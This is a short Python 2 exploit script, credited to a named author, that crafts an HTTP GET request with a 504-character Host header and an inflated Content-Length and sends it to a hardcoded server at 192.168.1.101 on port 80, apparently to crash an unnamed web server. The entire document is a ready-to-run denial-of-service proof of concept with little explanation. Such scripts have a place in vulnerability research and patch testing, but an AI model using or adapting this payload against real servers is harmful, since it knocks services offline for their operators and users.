#!/usr/bin/python

import socket
import os
import sys

crash = "0" * 504

buffer="GET / HTTP/1.1\r\n"
buffer+="Host: " + crash + "\r\n"
buffer+="Content-Type: application/x-www-form-urlencoded\r\n"
buffer+="User-Agent: Mozilla/5.0 (X11; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1\r\n"
buffer+="Content-Length : 1048580\r\n\r\n"

print "[*] Exploit c0ded by Zee Eichel - zee[at]cr0security.com"
print "[*] Change some option in code with your self"
print "[*] Connect to host and send payload"

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("192.168.1.101", 80))
expl.send(buffer)
print "[*] Server Disconected"
expl.close()